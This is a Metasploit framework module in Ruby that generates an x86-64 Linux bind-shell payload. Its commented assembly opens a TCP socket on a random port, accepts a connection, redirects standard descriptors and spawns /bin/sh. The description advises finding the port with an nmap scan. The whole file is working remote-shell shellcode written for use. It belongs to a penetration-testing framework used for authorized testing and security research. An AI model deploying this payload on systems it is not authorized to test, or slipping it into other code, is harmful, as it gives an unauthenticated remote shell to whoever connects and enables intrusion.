##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 51

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
      'Description'   => %q{
        Listen for a connection in a random port and spawn a command shell.
        Use nmap to discover the open port: 'nmap -sS target -p-'.
      },
      'Author'        => 'Geyslan G. Bem <geyslan[at]gmail.com>',
      'License'       => BSD_LICENSE,
      'References'    => ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64
    ))
  end

  def generate_stage
    payload = %Q^
      ; Creating the socket file descriptor
      ; int socket(int domain, int type, int protocol);
      ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

      ; socket arguments (bits/socket.h, netinet/in.h)

      ; Avoiding garbage
      ; These push and pop unset the sign bit in rax used for cdq
      push 41       ; syscall 41 - socket
      pop rax

      ; Zeroing rdx, search about cdq instruction for understanding
      cdq           ; IPPROTO_IP = 0 (int) - rdx

      push 1        ; SOCK_STREAM = 1 (int)
      pop rsi

      push 2        ; AF_INET = 2 (int)
      pop rdi

                    ; syscall 41 (rax) - socket
      syscall       ; kernel interruption


      ; Preparing to listen the incoming connection (passive socket)
      ; int listen(int sockfd, int backlog);
      ; listen(sockfd, int);

      ; listen args ; just let rsi (backlog) as 1 - man(2) listen

      xchg eax, edi ; put the file descriptor returned by socket() into rdi

      mov al, 50    ; syscall 50 - listen
      syscall       ; kernel interruption


      ; Accepting the incoming connection
      ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
      ; accept(sockfd, NULL, NULL)

      ; accept args ; rdi already contains the sockfd, likewise rdx contains 0

      xchg eax, esi ; put listen() return (0) into rsi

      mov al, 43    ; syscall 43 - accept
      syscall       ; kernel interruption


      ; Creating a interchangeably copy of the file descriptors
      ; int dup2(int oldfd, int newfd);
      ; dup2(clientfd, ...)

      xchg edi, eax ; put the clientfd returned from accept into rdi
      xchg esi, eax ; put the sockfd integer into rsi to use as the loop counter

    dup_loop:
      dec esi       ; decrement loop counter

      push 33       ; syscall 33 - dup2
      pop rax
      syscall       ; kernel interruption

      jnz dup_loop


      ; Finally, using execve to substitute the actual process with /bin/sh
      ; int execve(const char *filename, char *const argv[], char *const envp[]);
      ; exevcve("//bin/sh", NULL, NULL)

      ; execve string argument
                    ; *envp[] rdx is already NULL
                    ; *argv[] rsi is already NULL
      push rdx      ; put NULL terminating string
      mov rdi, 0x68732f6e69622f2f ; "//bin/sh"
      push rdi      ; push //bin/sh string
      push rsp      ; push the stack pointer
      pop rdi       ; pop it (string address) into rdi

      mov al, 59    ; execve syscall
      syscall       ; bingo
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
  end
end
